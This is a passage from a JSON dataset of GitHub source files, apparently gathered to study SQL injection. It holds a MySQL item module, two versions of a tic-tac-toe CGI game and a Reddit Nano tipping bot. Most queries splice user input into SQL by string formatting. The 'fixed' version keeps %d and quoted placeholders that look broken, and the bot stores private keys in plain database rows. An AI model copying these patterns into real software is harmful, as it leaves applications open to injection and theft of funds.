name))\n        except Exception as ex:\n            _error_report(ex)\n            return False\n        await conn.commit() \n\n    return True\n\nasync def create_item(player_uid:int, item_id: int):\n    '''db  .'''\n    global _pool\n    uid = -1\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"INSERT INTO item (player_uid, item_id)\\\n                 values (%d, %d)\" % (player_uid, item_id))\n            uid = conn.insert_id()\n        except Exception as ex:\n            _error_report(ex)\n            return False, -1\n        await conn.commit()\n\n    return True, uid\n\nasync def get_item_list(player_uid: int):\n    '''db      .'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"SELECT uid, item_id FROM item where player_uid = %d\" % player_uid)\n                datas = cursor.fetchall()\n        except Exception as ex:\n            _error_report(ex)\n            return tuple(), False\n\n    return datas, True\n\ndef close():\n    '''db pool .'''\n    global _pool\n    if _pool is not None:\n        _pool.close()\n        _pool = None\n\ndef _error_report(err_msg):\n    '''   .'''\n    global _handler\n    if _handler:\n        _handler(err_msg)\n\nif __name__ == '__main__':\n    def error_handler(msg):\n        print(msg)\n\n    loop = asyncio.get_event_loop()\n    set_log_handler(error_handler)\n    result = connect_db_server('127.0.0.1', 'root', 'Mysql12345', 'mud_db', loop)\n    print('db connect result is ' + str(result))\n    loop.run_until_complete(create_item(37, 0))\n    close()\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/russ-lewis/ttt_-_python_cgi/blob/3a73700c60dba3c712dfc3c74c19c873e8e71a33",
        "file_path": "/cgi/common.py",
        "source": "# NOTE: I did *NOT* add a shebang here, intentionally, because\n#       this is *NEVER* supposed to be a user-facing script!\n\n\n\nclass FormError(BaseException):\n    def __init__(this, msg):\n        this.msg = msg\n\n\n\ndef get_game_info(conn, game):\n    # get the basic game properties\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT player1,player2,size,state FROM games WHERE id = %d;\" % game)\n    if cursor.rowcount != 1:\n        raise FormError(\"Invalid game ID\")\n\n    row = cursor.fetchall()[0]\n    players = [row[0],row[1]]\n    size    =  row[2]\n    state   =  row[3]\n\n    if state is None:\n         state = \"Active\"\n\n    cursor.close()\n\n    return (players,size,state)\n\n\n\ndef build_board(conn, game,size):\n    # we'll build the empty board, and then fill in with the move list that\n    # we get from the DB.\n    board = []\n    for i in range(size):\n        board.append([\"\"]*size)\n\n\n    # search for all moves that have happenend during this game.\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT x,y,letter FROM moves WHERE gameID = %d;\" % game)\n\n    counts = {\"X\":0, \"O\":0}\n    for move in cursor.fetchall():\n        (x,y,letter) = move\n\n        x = int(x)\n        y = int(y)\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert letter in \"XO\"\n\n        assert board[x][y] == \"\"\n        board[x][y] = letter\n\n        counts[letter] += 1\n\n    cursor.close()\n\n    assert counts[\"X\"] >= counts[\"O\"]\n    assert counts[\"X\"] <= counts[\"O\"]+1\n\n    if counts[\"X\"] == counts[\"O\"]:\n        nextPlayer = 0\n    else:\n        nextPlayer = 1\n    letter = \"XO\"[nextPlayer]\n\n    return (board,nextPlayer,letter)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/russ-lewis/ttt_-_python_cgi/blob/3a73700c60dba3c712dfc3c74c19c873e8e71a33",
        "file_path": "/cgi/create_game.py",
        "source": "#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    if \"player1\" not in form or \"player2\" not in form or \"size\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    player1 = form[\"player1\"].value\n    player2 = form[\"player2\"].value\n    for c in player1+player2:\n        if c not in \"_-\" and not c.isdigit() and not c.isalpha():\n            raise FormError(\"Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens\")\n            return\n\n    try:\n        size = int(form[\"size\"].value)\n    except:\n        raise FormError(\"Invalid parameters: 'size' is not an integer.\")\n        return\n\n    if size < 2 or size > 9:\n        raise FormError(\"The 'size' must be in the range 2-9, inclusive.\")\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n    cursor = conn.cursor()\n\n    # insert the new row\n    cursor.execute(\"\"\"INSERT INTO games(player1,player2,size) VALUES(\"%s\",\"%s\",%d);\"\"\" % (player1,player2,size))\n\n    gameID = cursor.lastrowid\n\n\n    # MySQLdb has been building a transaction as we run.  Commit them now, and\n    # also clean up the other resources we've allocated.\n    conn.commit()\n    cursor.close()\n    conn.close()\n\n    return gameID\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n    #print(\"Content-type: text/html\")\n    #print()\n\n    # this will not print out *ANYTHING* !!!\n    gameID = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/list.py?new_game=%s\"\"\" % (pnsdp.WEB_HOST,gameID))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/russ-lewis/ttt_-_python_cgi/blob/3a73700c60dba3c712dfc3c74c19c873e8e71a33",
        "file_path": "/cgi/move.py",
        "source": "#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import get_game_info,build_board,FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n\n\n    if \"user\" not in form or \"game\" not in form:\n        raise FormError(\"Invalid parameters.\")\n    if \"pos\" not in form and \"resign\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    game = int(form[\"game\"].value)\n\n\n    (players,size,state) = get_game_info(conn, game)\n\n    user = form[\"user\"].value\n    if user not in players:\n        raise FormError(\"Invalid player ID - player is not part of this game\")\n\n\n    if \"resign\" in form:\n        resign = True\n    else:\n        resign = False\n        pos = form[\"pos\"].value.split(\",\")\n        assert len(pos) == 2\n        x = int(pos[0])\n        y = int(pos[1])\n\n\n    (board,nextPlayer,letter) = build_board(conn, game,size)\n\n    if user != players[nextPlayer]:\n        raise FormError(\"Internal error, incorrect player is attempting to move.\")\n\n\n    if resign:\n        # this user is choosing to resign.  Update the game state to reflect that.\n        other_player_name = players[1-nextPlayer]\n\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"UPDATE games SET state=\"%s:resignation\" WHERE id=%d;\"\"\" % (other_player_name,game))\n        cursor.close()\n\n    else:\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert board[x][y] == \"\"\n        board[x][y] = \"XO\"[nextPlayer]\n\n        # we've done all of our sanity checks.  We now know enough to say that\n        # it's safe to add a new move.\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,\"%s\",NOW());\"\"\" % (game,x,y,letter))\n\n        if cursor.rowcount != 1:\n            raise FormError(\"Could not make move, reason unknown.\")\n\n        cursor.close()\n\n        result = analyze_board(board)\n        if result != \"\":\n            if result == \"win\":\n                result = players[nextPlayer]+\":win\"\n\n            cursor = conn.cursor()\n            cursor.execute(\"\"\"UPDATE games SET state=\"%s\" WHERE id=%d;\"\"\" % (result,game))\n            cursor.close()\n\n    # we've made changes, make sure to commit them!\n    conn.commit()\n    conn.close()\n\n\n    # return the parms to the caller, so that they can build a good redirect\n    return (user,game)\n\n\n\ndef analyze_board(board):\n    size = len(board)\n\n    for x in range(size):\n        # scan through the column 'x' to see if they are all the same.\n        if board[x][0] == \"\":\n            continue\n        all_same = True\n        for y in range(1,size):\n            if board[x][y] != board[x][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    for y in range(size):\n        # scan through the row 'y' to see if they are all the same.\n        if board[0][y] == \"\":\n            continue\n        all_same = True\n        for x in range(1,size):\n            if board[x][y] != board[0][y]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NW/SE diagonal\n    if board[0][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[i][i] != board[0][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NE/SW diagonal\n    if board[size-1][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[size-1-i][i] != board[size-1][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check for stalemate\n    for x in range(size):\n        for y in range(size):\n            if board[x][y] == \"\":\n                return \"\"\n    return \"stalemate\"\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n#    print(\"Content-type: text/html\")\n#    print()\n\n    # this will not print out *ANYTHING* !!!\n    (user,game) = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/game.py?user=%s&game=%s\"\"\" % (pnsdp.WEB_HOST, user,game))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\\n\\n\"\"\")\n\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/russ-lewis/ttt_-_python_cgi/blob/e31f5a1e70e859c157cdc8a99464ded5947e2f37",
        "file_path": "/cgi/common.py",
        "source": "# NOTE: I did *NOT* add a shebang here, intentionally, because\n#       this is *NEVER* supposed to be a user-facing script!\n\n\n\nclass FormError(BaseException):\n    def __init__(this, msg):\n        this.msg = msg\n\n\n\ndef get_game_info(conn, game):\n    # get the basic game properties\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT player1,player2,size,state FROM games WHERE id = %d;\", (game,))\n    if cursor.rowcount != 1:\n        raise FormError(\"Invalid game ID\")\n\n    row = cursor.fetchall()[0]\n    players = [row[0],row[1]]\n    size    =  row[2]\n    state   =  row[3]\n\n    if state is None:\n         state = \"Active\"\n\n    cursor.close()\n\n    return (players,size,state)\n\n\n\ndef build_board(conn, game,size):\n    # we'll build the empty board, and then fill in with the move list that\n    # we get from the DB.\n    board = []\n    for i in range(size):\n        board.append([\"\"]*size)\n\n\n    # search for all moves that have happenend during this game.\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT x,y,letter FROM moves WHERE gameID = %d;\", (game,))\n\n    counts = {\"X\":0, \"O\":0}\n    for move in cursor.fetchall():\n        (x,y,letter) = move\n\n        x = int(x)\n        y = int(y)\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert letter in \"XO\"\n\n        assert board[x][y] == \"\"\n        board[x][y] = letter\n\n        counts[letter] += 1\n\n    cursor.close()\n\n    assert counts[\"X\"] >= counts[\"O\"]\n    assert counts[\"X\"] <= counts[\"O\"]+1\n\n    if counts[\"X\"] == counts[\"O\"]:\n        nextPlayer = 0\n    else:\n        nextPlayer = 1\n    letter = \"XO\"[nextPlayer]\n\n    return (board,nextPlayer,letter)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/russ-lewis/ttt_-_python_cgi/blob/e31f5a1e70e859c157cdc8a99464ded5947e2f37",
        "file_path": "/cgi/create_game.py",
        "source": "#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    if \"player1\" not in form or \"player2\" not in form or \"size\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    player1 = form[\"player1\"].value\n    player2 = form[\"player2\"].value\n    for c in player1+player2:\n        if c not in \"_-\" and not c.isdigit() and not c.isalpha():\n            raise FormError(\"Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens\")\n            return\n\n    try:\n        size = int(form[\"size\"].value)\n    except:\n        raise FormError(\"Invalid parameters: 'size' is not an integer.\")\n        return\n\n    if size < 2 or size > 9:\n        raise FormError(\"The 'size' must be in the range 2-9, inclusive.\")\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n    cursor = conn.cursor()\n\n    # insert the new row\n    cursor.execute(\"\"\"INSERT INTO games(player1,player2,size) VALUES(\"%s\",\"%s\",%d);\"\"\", (player1,player2,size))\n\n    gameID = cursor.lastrowid\n\n\n    # MySQLdb has been building a transaction as we run.  Commit them now, and\n    # also clean up the other resources we've allocated.\n    conn.commit()\n    cursor.close()\n    conn.close()\n\n    return gameID\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n    #print(\"Content-type: text/html\")\n    #print()\n\n    # this will not print out *ANYTHING* !!!\n    gameID = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/list.py?new_game=%s\"\"\" % (pnsdp.WEB_HOST,gameID))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/russ-lewis/ttt_-_python_cgi/blob/e31f5a1e70e859c157cdc8a99464ded5947e2f37",
        "file_path": "/cgi/move.py",
        "source": "#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import get_game_info,build_board,FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n\n\n    if \"user\" not in form or \"game\" not in form:\n        raise FormError(\"Invalid parameters.\")\n    if \"pos\" not in form and \"resign\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    game = int(form[\"game\"].value)\n\n\n    (players,size,state) = get_game_info(conn, game)\n\n    user = form[\"user\"].value\n    if user not in players:\n        raise FormError(\"Invalid player ID - player is not part of this game\")\n\n\n    if \"resign\" in form:\n        resign = True\n    else:\n        resign = False\n        pos = form[\"pos\"].value.split(\",\")\n        assert len(pos) == 2\n        x = int(pos[0])\n        y = int(pos[1])\n\n\n    (board,nextPlayer,letter) = build_board(conn, game,size)\n\n    if user != players[nextPlayer]:\n        raise FormError(\"Internal error, incorrect player is attempting to move.\")\n\n\n    if resign:\n        # this user is choosing to resign.  Update the game state to reflect that.\n        other_player_name = players[1-nextPlayer]\n\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"UPDATE games SET state=\"%s:resignation\" WHERE id=%d;\"\"\", (other_player_name,game))\n        cursor.close()\n\n    else:\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert board[x][y] == \"\"\n        board[x][y] = \"XO\"[nextPlayer]\n\n        # we've done all of our sanity checks.  We now know enough to say that\n        # it's safe to add a new move.\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,\"%s\",NOW());\"\"\", (game,x,y,letter))\n\n        if cursor.rowcount != 1:\n            raise FormError(\"Could not make move, reason unknown.\")\n\n        cursor.close()\n\n        result = analyze_board(board)\n        if result != \"\":\n            if result == \"win\":\n                result = players[nextPlayer]+\":win\"\n\n            cursor = conn.cursor()\n            cursor.execute(\"\"\"UPDATE games SET state=\"%s\" WHERE id=%d;\"\"\", (result,game))\n            cursor.close()\n\n    # we've made changes, make sure to commit them!\n    conn.commit()\n    conn.close()\n\n\n    # return the parms to the caller, so that they can build a good redirect\n    return (user,game)\n\n\n\ndef analyze_board(board):\n    size = len(board)\n\n    for x in range(size):\n        # scan through the column 'x' to see if they are all the same.\n        if board[x][0] == \"\":\n            continue\n        all_same = True\n        for y in range(1,size):\n            if board[x][y] != board[x][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    for y in range(size):\n        # scan through the row 'y' to see if they are all the same.\n        if board[0][y] == \"\":\n            continue\n        all_same = True\n        for x in range(1,size):\n            if board[x][y] != board[0][y]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NW/SE diagonal\n    if board[0][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[i][i] != board[0][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NE/SW diagonal\n    if board[size-1][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[size-1-i][i] != board[size-1][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check for stalemate\n    for x in range(size):\n        for y in range(size):\n            if board[x][y] == \"\":\n                return \"\"\n    return \"stalemate\"\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n#    print(\"Content-type: text/html\")\n#    print()\n\n    # this will not print out *ANYTHING* !!!\n    (user,game) = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/game.py?user=%s&game=%s\"\"\" % (pnsdp.WEB_HOST, user,game))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\\n\\n\"\"\")\n\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/danhitchcock/nano_tipper_z/blob/d91ae3946544f8e1b7c44bc2722acb3d03ee3f6e",
        "file_path": "/nano_tipper_z.py",
        "source": "import praw\r\nimport time\r\nfrom datetime import datetime\r\nfrom time import sleep\r\nfrom rpc_bindings import send, open_account, generate_account, generate_qr, nano_to_raw, receive_all, send_all, \\\r\n    check_balance, validate_address, open_or_receive\r\nimport mysql.connector\r\nimport pprint\r\n\r\ncomment_footer = \"\"\"\r\n\\n\\n*Nano Tipper Z Bot v0.1. Replies to this comment might be treated as PM commands. This program is in beta testing,\r\n and your funds could be lost.*\r\n\"\"\"\r\n\r\nhelp_text = \"\"\"\r\nNano Tipper Z Bot v0.1. Use at your own risk, and don't put in more Nano than you're willing to lose.\\n\\n\r\nTo perform a command, create a new message with any of the following commands in the message body.\\n\\n\r\n'create' - Create a new account if one does not exist\\n\\n\r\n'private_key' -  (disabled) Retrieve your account private key\\n\\n\r\n'new_address' - (disabled) If you feel this address was compromised, create a new account and key\\n\\n\r\n'send <amount> <user/address> - Send Nano to a reddit user or an address\\n\\n\r\n'receive' - Receive all pending transactions\\n\\n\r\n'balance' - Retrieve your account balance. Includes both pocketed and unpocketed transactions.\\n\\n\r\n'minimum <amount>' - Sets a minimum amount for receiving tips. Program minimum is 0.001 Nano.\\n\\n\r\n'help' - Get this help message\\n\\n\\n\r\nIf you have any questions or bug fixes, please contact /u/zily88.\r\n\"\"\"\r\nreddit = praw.Reddit('bot1')\r\n#submission = reddit.submission(id='39zje0')\r\n#print(submission.title) # to make it non-lazy\r\n#print(submission.created)\r\n#print(datetime.utcfromtimestamp(submission.created_utc).strftime('%Y-%m-%d %H:%M:%S'))\r\n#pprint.pprint(vars(submission))\r\n\r\nsubreddit = reddit.subreddit(\"nano_tipper_z+cryptocurrency247\")\r\n\r\ntip_froms = []\r\ntip_parents = []\r\ntip_tos = []\r\ntip_comments = []\r\ntip_amounts = []\r\nlast_action = time.time()\r\nprogram_minimum = 0.001\r\nrecipient_minimum = 0.01\r\n\r\nwith open('sql_password.txt') as f:\r\n    sql_password = f.read()\r\n\r\nmydb = mysql.connector.connect(user='root', password=sql_password,\r\n                              host='localhost',\r\n                              auth_plugin='mysql_native_password', database='nano_tipper_z')\r\nmycursor = mydb.cursor()\r\n\r\n#generator for our comments. Maybe this wasn't necessary, but I never get to use generators\r\ndef stream_comments_messages():\r\n    previous_comments = {comment for comment in subreddit.comments()}\r\n    previous_messages = {message for message in reddit.inbox.unread()}\r\n    print('received first stream')\r\n    while True:\r\n        sleep(6)\r\n        global last_action\r\n        last_action = time.time()\r\n\r\n        updated_comments = {comment for comment in subreddit.comments()}\r\n        new_comments = updated_comments - previous_comments\r\n        previous_comments = updated_comments\r\n\r\n        # check for new messages\r\n        updated_messages = {message for message in reddit.inbox.unread()}\r\n        new_messages = updated_messages - previous_messages\r\n        previous_messages = updated_messages\r\n\r\n        # send anything new to our main program\r\n        # also, check the message type. this will prevent posts from being seen as messages\r\n        if len(new_comments) >= 1:\r\n            for new_comment in new_comments:\r\n                # if new_comment starts with 't1_'\r\n                print('full name: ', new_comment.name)\r\n                if new_comment.name[:3] == 't1_':\r\n                    yield ('comment', new_comment)\r\n        if len(new_messages) >= 1:\r\n            for new_message in new_messages:\r\n                # if message starts with 't4_'\r\n                print('full name: ', new_message.name)\r\n                if new_message.name[:3] == 't4_':\r\n                    yield ('message', new_message)\r\n\r\n        else:\r\n            yield None\r\n\r\n\r\ndef update_history():\r\n    return None\r\n\r\n\r\ndef add_history_record(username=None, action=None, sql_time=None, address=None, comment_or_message=None,\r\n                       recipient_username=None, recipient_address=None, amount=None, hash=None, comment_id=None,\r\n                       notes=None, reddit_time=None, comment_text=None):\r\n    if sql_time is None:\r\n        sql_time = time.strftime('%Y-%m-%d %H:%M:%S')\r\n\r\n    sql = \"INSERT INTO history (username, action, sql_time, address, comment_or_message, recipient_username, \" \\\r\n          \"recipient_address, amount, hash, comment_id, notes, reddit_time, comment_text) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)\"\r\n\r\n    val = (username, action, sql_time, address, comment_or_message, recipient_username, recipient_address, amount,\r\n           hash, comment_id, notes, reddit_time, comment_text)\r\n\r\n    mycursor.execute(sql, val)\r\n    mydb.commit()\r\n    return mycursor.lastrowid\r\n\r\n\r\ndef check_registered_by_address(address):\r\n    address = address.split('_')[1]\r\n    mycursor.execute(\"SELECT username FROM accounts WHERE address='%s'\" % ('xrb_' + address))\r\n    result = mycursor.fetchall()\r\n    if len(result) > 0:\r\n        return result[0][0]\r\n\r\n    mycursor.execute(\"SELECT username FROM accounts WHERE address='%s'\" % ('nano_' + address))\r\n    result = mycursor.fetchall()\r\n    if len(result) > 0:\r\n        return result[0][0]\r\n\r\n    return None\r\n\r\n#updated\r\ndef add_new_account(username):\r\n    address = generate_account()\r\n    private = address['private']\r\n    address = address['account']\r\n    print(type(private), type(address), type(username))\r\n    print(private, address, username)\r\n    sql = \"INSERT INTO accounts (username, private_key, address, minimum) VALUES (%s, %s, %s, %s)\"\r\n    val = (username, private, address, nano_to_raw(0.01))\r\n    mycursor.execute(sql, val)\r\n    mydb.commit()\r\n    return address\r\n\r\n\r\ndef handle_create(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        comment_or_message='message',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        action='create',\r\n        comment_text=str(message.body)[:255]\r\n    )\r\n\r\n    username = str(message.author)\r\n    mycursor.execute(\"SELECT address FROM accounts WHERE username='%s'\" % username)\r\n    result = mycursor.fetchall()\r\n    if len(result) is 0:\r\n        address = add_new_account(username)\r\n        response = \"Hi! I have created a new account for you. Your Nano address is %s. Once Nano is sent to your new account,\" \\\r\n                   \" your balance will be\" \\\r\n                   \" unpocketed until you respond and have 'receive' in the message body.\\n\\nhttps://www.nanode.co/account/%s\" % (address, address)\r\n    else:\r\n        response = \"It looks like you already have an account made. Your Nano address is %s. Once Nano is sent to your account, your balance will be\" \\\r\n                 \" unpocketed until you respond and have 'receive' in the message body.\\n\\nhttps://www.nanode.co/account/%s\" % (result[0][0], result[0][0])\r\n    x = reddit.redditor(username).message('Nano Tipper Z: Account Creation', response)\r\n    # message.reply(response)\r\n\r\n\r\n# currently deactivated\r\ndef handle_private_key(message):\r\n    author = str(message.author)\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        comment_or_message='message',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        action='private_key',\r\n        comment_text=str(message.body)[:255]\r\n    )\r\n    mycursor.execute(\"SELECT address, private_key FROM accounts WHERE name='%s'\" %author)\r\n    result = mycursor.fetchall()\r\n    if len(result) > 0:\r\n        response = 'Your account: %s\\n\\nYour private key: %s'%(result[0][0],result[0][1])\r\n        x = reddit.redditor(username).message('New Private Key', response)\r\n        return None\r\n    else:\r\n        x = reddit.redditor(username).message(\"No account found.\",\"You do not currently have an account open.\"\r\n                                                                \"To create one, respond with the text 'create' in the message body.\")\r\n        return None\r\n\r\n\r\n#updated\r\ndef handle_balance(message):\r\n    username = str(message.author)\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        comment_or_message='message',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        action='balance',\r\n        comment_text=str(message.body)[:255]\r\n    )\r\n\r\n    mycursor.execute(\"SELECT address FROM accounts WHERE username='%s'\" % username)\r\n    result = mycursor.fetchall()\r\n    if len(result)>0:\r\n        results = check_balance(result[0][0])\r\n\r\n        